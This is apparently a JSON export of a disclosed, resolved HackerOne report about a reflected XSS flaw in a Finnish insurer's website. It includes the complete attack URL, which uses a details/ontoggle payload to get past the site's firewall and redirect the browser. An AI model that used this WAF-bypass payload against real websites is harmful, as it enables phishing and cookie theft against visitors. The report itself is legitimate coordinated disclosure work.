{"id":301680,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE2ODA=","url":"https://hackerone.com/reports/301680","title":"Reflected XSS Vulnerability in https://www.lahitapiola.fi/cs/Satellite","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-01-01T20:16:24.756Z","submitted_at":"2018-01-01T20:16:24.756Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"teemuk","url":"/teemuk","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/557/e915926b8e01ab33434559ed179151a879d792ba_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-04-11T06:34:46.473Z","bug_reporter_agreed_on_going_public_at":"2018-04-11T06:34:46.365Z","team_member_agreed_on_going_public_at":"2018-04-09T20:17:53.854Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Basic report information\n**Summary:** Reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite.`\n\n**Description:** There exists a reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav`. Value of query string parameter `rendermode` is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using `onToggle` event in `\u003cdetails\u003e` HTML element. The javascript that is used to demonstrate the vulnerability is `location.href=\"https://www.google.com/?q=\"+document.domain`. This demonstrates an open redirect type of vulnerability where user's browser is redirected to the attacker page where the attacker can e.g. perform phishing.\n\n**Domain:** `www.lahitapiola.fi`\n\n## Browsers / Apps Verified In:\n\n  * Firefox version 57.0.3\n\n## Steps To Reproduce:\n\nAccess the attack URL `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav\u0026rendermode=preview\"\u003e\u003cdetails%20open=true%20ontoggle=%27location.href=\"https://www.google.com/?q=\"%2Bdocument.domain%27\u003e\u003csummary\u003etesting\u003c/summary\u003e\u003c/details\u003e`\nBrowser is redirected to `https://www.google.com/?q=www.lahitapiola.fi`.\n\n## Additional material\n\n* N/A\n\n## Related reports, best practices\n\nThis vulnerability is related to the previously reported Oracle Webcenter Sites vulnerabilities (e.g. #170532)\n\n## Impact\n\nAn attacker can use reflected XSS vulnerabilities to inject content to pages served from `www.lahitapiola.fi`. This can be used e.g. for phishing purposes or to e.g. steal cookies from user's browser.","vulnerability_information_html":"\u003ch2 id=\"basic-report-information\"\u003eBasic report information\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e Reflected XSS vulnerability in \u003ccode\u003ehttps://www.lahitapiola.fi/cs/Satellite.\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e There exists a reflected XSS vulnerability in \u003ccode\u003ehttps://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav\u003c/code\u003e. Value of query string parameter \u003ccode\u003erendermode\u003c/code\u003e is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using \u003ccode\u003eonToggle\u003c/code\u003e event in \u003ccode\u003e\u0026lt;details\u0026gt;\u003c/code\u003e HTML element. The javascript that is used to demonstrate the vulnerability is \u003ccode\u003elocation.href=\u0026quot;https://www.google.com/?q=\u0026quot;+document.domain\u003c/code\u003e. This demonstrates an open redirect type of vulnerability where user\u0026#39;s browser is redirected to the attacker page where the attacker can e.g. perform phishing.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDomain:\u003c/strong\u003e \u003ccode\u003ewww.lahitapiola.fi\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"browsers-apps-verified-in\"\u003eBrowsers / Apps Verified In:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eFirefox version 57.0.3\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eAccess the attack URL \u003ccode\u003ehttps://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav\u0026amp;rendermode=preview\u0026quot;\u0026gt;\u0026lt;details%20open=true%20ontoggle=%27location.href=\u0026quot;https://www.google.com/?q=\u0026quot;%2Bdocument.domain%27\u0026gt;\u0026lt;summary\u0026gt;testing\u0026lt;/summary\u0026gt;\u0026lt;/details\u0026gt;\u003c/code\u003e\u003cbr\u003e\nBrowser is redirected to \u003ccode\u003ehttps://www.google.com/?q=www.lahitapiola.fi\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"additional-material\"\u003eAdditional material\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eN/A\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"related-reports-best-practices\"\u003eRelated reports, best practices\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability is related to the previously reported Oracle Webcenter Sites vulnerabilities (e.g. \u003ca href=\"/reports/170532\"\u003e#170532\u003c/a\u003e)\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can use reflected XSS vulnerabilities to inject content to pages served from \u003ccode\u003ewww.lahitapiola.fi\u003c/code\u003e. This can be used e.g. for phishing purposes or to e.g. steal cookies from user\u0026#39;s browser.\u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["tk0","eveeez","harry_mg","whitesector","japz","666reda"],"severity":{"rating":"medium","score":4.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":1045,"asset_type":"URL","asset_identifier":"www.lahitapiola.fi","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2255202,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\n\n*Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report*","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eNote: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - \u003ca title=\"https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" href=\"/redirect?url=https%3A%2F%2Fsupport.hackerone.com%2Fhc%2Fen-us%2Farticles%2F211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-02T04:30:47.576Z","updated_at":"2018-01-02T04:30:47.576Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2379656,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This issue has mysteriously disappeared after a systems software upgrade.","markdown_message":"\u003cp\u003eThis issue has mysteriously disappeared after a systems software upgrade.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-13T17:46:33.589Z","updated_at":"2018-02-13T17:46:33.589Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2442568,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-28T11:48:44.061Z","updated_at":"2018-02-28T11:48:44.061Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"teemuk","url":"/teemuk"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2442570,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the report.","markdown_message":"\u003cp\u003eThank you for the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-28T11:49:06.122Z","updated_at":"2018-02-28T11:49:06.122Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"teemuk","url":"/teemuk"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2583192,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We can have full disclosure.","markdown_message":"\u003cp\u003eWe can have full disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-09T20:17:53.882Z","updated_at":"2018-04-09T20:17:53.882Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2588973,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-11T06:34:46.411Z","updated_at":"2018-04-11T06:34:46.411Z","actor":{"username":"teemuk","cleared":false,"url":"/teemuk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/557/e915926b8e01ab33434559ed179151a879d792ba_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2588974,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-11T06:34:46.506Z","updated_at":"2018-04-11T06:34:46.506Z","actor":{"username":"teemuk","cleared":false,"url":"/teemuk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/557/e915926b8e01ab33434559ed179151a879d792ba_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":7062,"category":"team","content":"##Issue\nThe reporter found a reflected XXS in the Satellite server.\n\n##Fix\n\nWhile the issue was investigated, there were some backend updates done which apparently automatically mysteriously fixed the issue. Poof.\n\n##Reasoning\n\nBased on the report, the issue was found to be valid. Working single click open redirects which are easily usable in phishing attacks are always an issue for us. ","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter found a reflected XXS in the Satellite server.\u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eWhile the issue was investigated, there were some backend updates done which apparently automatically mysteriously fixed the issue. Poof.\u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eBased on the report, the issue was found to be valid. Working single click open redirects which are easily usable in phishing attacks are always an issue for us. \u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}